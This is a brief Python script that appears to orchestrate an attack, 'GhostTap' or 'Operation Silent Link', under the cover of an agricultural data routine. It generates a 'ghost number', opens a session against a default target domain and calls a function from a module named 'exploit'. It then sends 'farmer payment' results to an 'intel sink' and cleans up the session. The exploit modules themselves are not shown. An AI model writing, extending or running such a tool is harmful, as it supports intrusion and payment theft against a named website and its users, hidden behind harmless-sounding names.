# GhostTap Core Orchestrator
# Operation Silent Link - Agricultural data collection routine
import sys
from ghostlink.number_gen import generate_ghost_number
from ghostlink.engager import fetch_market_session
from ghostlink.exploit import calc_harvest_yield
from ghostlink.intel_sink import log_farmer_payment
from ghostlink.cleaner import end_session

def main(target):
    number = generate_ghost_number()
    session = fetch_market_session(target, number)
    result = calc_harvest_yield(session)
    log_farmer_payment(result)
    end_session(session)
    print(f"[GhostTap] Harvest cycle complete for {target}")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "afrivexa.com"
    main(target)
